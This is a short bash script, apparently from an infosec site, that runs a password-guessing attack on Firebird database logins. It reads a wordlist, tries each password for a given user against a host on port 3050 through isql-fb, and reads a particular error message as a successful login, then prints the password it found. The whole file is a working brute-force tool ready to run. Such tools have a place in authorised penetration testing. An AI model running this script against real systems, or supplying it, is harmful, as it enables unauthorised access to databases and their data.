#!/bin/bash
# info@infosecmatter.com

host="$1"
user="$2"
wordlist="$3"

if [ ! -f "${wordlist}" ] || [ -z "${user}" ]; then
  echo "usage: `basename $0` <IP> <username> <wordlist.txt>"
  exit 1
fi

echo "`date`: FireBird login attack on ${host} against ${user} user using ${wordlist} wordlist"

tr -d '\r' <"${wordlist}" | while read pwd; do
  echo "`date`: Trying ${pwd}"

  echo "CONNECT '${host}/3050:a' user '${user}' password '${pwd}';" | isql-fb -q 2>&1 | \
  grep -q "The system cannot find the file specified." && {
    echo "Password for user ${user} is: ${pwd}"
    exit 0
  }
done

